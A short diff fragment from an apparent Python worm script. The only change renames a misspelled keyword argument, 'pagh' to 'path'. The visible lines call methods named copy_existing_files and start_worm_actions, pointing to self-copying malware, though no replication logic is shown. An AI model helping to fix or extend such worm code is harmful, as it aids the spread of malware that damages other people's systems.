@@ -51,5 +51,5 @@ class Worm:
         self.copy_existing_files()
 if "name" == "__main__":
   current_directory = os.path.abspath("")
-  worm = Worm(pagh=current_directory)
+  worm = Worm(path=current_directory)
   worm.start_worm_actions()
